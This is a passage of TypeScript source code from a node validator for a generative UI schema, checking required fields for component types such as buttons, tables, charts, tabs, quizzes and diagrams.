      isStr('content')
      isStr('text')
      break
    case 'row': case 'col': case 'card': case 'grid':
      if (!Array.isArray(v.items)) errors.push(`${at}: type '${type}' requires items (array)`)
      walk(v.items, depth + 1, `${at}.items`)
      if (type === 'grid') isNum('cols')
      break
    case 'button': case 'checkbox': case 'link': case 'switch':
      if (typeof v.label !== 'string') errors.push(`${at}: type '${type}' requires label (string)`)
      isStr('label')
      break
    case 'audio': case 'video':
      if (typeof v.src !== 'string') errors.push(`${at}: type '${type}' requires src (string)`)
      isStr('src')
      isStr('alt')
      if (type === 'video') isStr('poster')
      break
    case 'slider':
      isStr('label')
      isNum('min'); isNum('max'); isNum('step'); isNum('value')
      break
    case 'input': case 'textarea':
      isStr('label'); isStr('placeholder'); isStr('value')
      break
    case 'select': case 'radio':
      if (!Array.isArray(v.options)) errors.push(`${at}: type '${type}' requires options (array)`)
      break
    case 'submit':
      if (typeof v.label !== 'string') errors.push(`${at}: type 'submit' requires label (string)`)
      // action is optional (local grading needs no round trip); the
      // renderer disables the button when it is absent AND no question
      // carries local `answer` data.
      break
    case 'badge':
      if (typeof v.label !== 'string' && typeof v.text !== 'string' && typeof v.value !== 'string') {
        errors.push(`${at}: type 'badge' requires label, text, or value (string)`)
      }
      isStr('label')
      isStr('text')
      isStr('value')
      break
    case 'stat':
      if (typeof v.label !== 'string') errors.push(`${at}: type 'stat' requires label (string)`)
      if (typeof v.value !== 'string') errors.push(`${at}: type 'stat' requires value (string)`)
      isStr('delta')
      break
    case 'progress':
      if (typeof v.value !== 'number' || !Number.isFinite(v.value) || (v.value as number) < 0 || (v.value as number) > 100) {
        errors.push(`${at}: type 'progress' requires value (number 0..100)`)
      }
      isNum('value')
      break
    case 'avatar':
      if (typeof v.name !== 'string') errors.push(`${at}: type 'avatar' requires name (string)`)
      break
    case 'list':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'list' requires items (array)`)
      if (Array.isArray(v.items)) {
        // Descend into typed children so validation agrees with repair and
        // rendering (they recurse into list items as GenuiNodes). Strings and
        // {title,desc} list-item shapes are not nodes and are skipped.
        for (let i = 0; i < v.items.length; i++) {
          const item = obj(v.items[i])
          if (item !== undefined && typeof item.type === 'string') {
            validateNode(item, depth + 1, `${at}.items[${i}]`, errors, walk)
          }
        }
      }
      break
    case 'table':
      if (!Array.isArray(v.columns)) errors.push(`${at}: type 'table' requires columns (array)`)
      if (!Array.isArray(v.rows)) errors.push(`${at}: type 'table' requires rows (array)`)
      break
    case 'chart':
      if (!Array.isArray(v.data) && !Array.isArray(v.series)) errors.push(`${at}: type 'chart' requires data or series (array)`)
      break
    case 'tabs': {
      if (!Array.isArray(v.tabs)) errors.push(`${at}: type 'tabs' requires tabs (array)`)
      if (Array.isArray(v.tabs)) {
        for (let i = 0; i < v.tabs.length; i++) {
          const t = obj(v.tabs[i])
          if (t === undefined) { errors.push(`${at}.tabs[${i}] must be an object`); continue }
          if (typeof t.label !== 'string') errors.push(`${at}.tabs[${i}].label must be a string`)
          walk(t.items, depth + 1, `${at}.tabs[${i}].items`)
        }
      }
      break
    }
    case 'plot':
      if (!Array.isArray(v.series)) errors.push(`${at}: type 'plot' requires series (array)`)
      break
    case 'callout':
      if (typeof v.content !== 'string') errors.push(`${at}: type 'callout' requires content (string)`)
      break
    case 'steps':
      if (!Array.isArray(v.steps)) errors.push(`${at}: type 'steps' requires steps (array)`)
      break
    case 'keyvalue':
      if (!Array.isArray(v.pairs)) errors.push(`${at}: type 'keyvalue' requires pairs (array)`)
      break
    case 'diff':
      if (!Array.isArray(v.diffs)) errors.push(`${at}: type 'diff' requires diffs (array)`)
      break
    case 'json':
      if (!('value' in v)) errors.push(`${at}: type 'json' requires value`)
      break
    case 'code':
      if (typeof v.code !== 'string') errors.push(`${at}: type 'code' requires code (string)`)
      break
    case 'accordion':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'accordion' requires items (array)`)
      if (Array.isArray(v.items)) {
        for (let i = 0; i < v.items.length; i++) {
          const item = obj(v.items[i])
          if (item === undefined) { errors.push(`${at}.items[${i}] must be an object`); continue }
          if (typeof item.title !== 'string') errors.push(`${at}.items[${i}].title must be a string`)
          walk(item.items, depth + 1, `${at}.items[${i}].items`)
        }
      }
      break
    case 'copy':
      if (typeof v.text !== 'string') errors.push(`${at}: type 'copy' requires text (string)`)
      break
    case 'mermaid':
      if (typeof v.code !== 'string') errors.push(`${at}: type 'mermaid' requires code (string)`)
      break
    case 'scene3d':
      if (!Array.isArray(v.meshes)) errors.push(`${at}: type 'scene3d' requires meshes (array)`)
      break
    case 'timeline':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'timeline' requires items (array)`)
      break
    case 'file-tree':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'file-tree' requires items (array)`)
      break
    case 'breadcrumb':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'breadcrumb' requires items (array)`)
      break
    case 'quiz':
      if (typeof v.question !== 'string') errors.push(`${at}: type 'quiz' requires question (string)`)
      if (!Array.isArray(v.options)) errors.push(`${at}: type 'quiz' requires options (array)`)
      break
    case 'diagram':
      if (typeof v.kind !== 'string') errors.push(`${at}: type 'diagram' requires kind (string)`)
      if (!Array.isArray(v.nodes)) errors.push(`${at}: type 'diagram' requires nodes (array)`)
      if (v.edges !== undefined && !Array.isArray(v.edges)) errors.push(`${at}: type 'diagram' requires edges (array) when present`)
      break

    case 'echart':
      if (v.option === undefined && v.data === undefined && v.series === undefined) {
        errors.push(`${at}: type 'echart' requires option, data, or series`)
      }
      isNum('height')
      break
    default:
      // Unknown type: plugin-registered custom nodes are valid when a
      // renderer exists; the guard cannot know, so report as a warning.
      errors.push(`${at}: unknown type '${type}' (custom renderer?)`)
  }
}
